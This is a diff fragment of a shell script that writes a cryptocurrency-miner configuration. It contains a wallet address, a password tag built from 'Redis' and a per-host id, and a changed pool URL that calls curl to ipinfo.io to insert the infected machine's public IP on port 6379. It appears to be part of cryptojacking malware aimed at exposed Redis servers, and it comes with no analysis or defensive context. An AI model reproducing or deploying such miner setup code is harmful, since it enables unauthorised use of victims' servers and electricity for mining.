@@ -79,7 +79,7 @@ echo '
         {
             "algo": null,
             "coin": null,
-            "url": "20.204.19.247:6379",
+            "url": "'$(curl -sSL https://ipinfo.io/ip)':6379",
             "user": "49196hYibtceivQiuyXctAVjMhsD5uRptifoHyrTjmJZ8hoGLnZh7x6dZDFw4mgHkaBJPVx5dhWDZ6GKXL5J6WLZJkgkxK4",
             "pass": "Redis-'$idnumber'~rx/0",
             "rig-id": null,
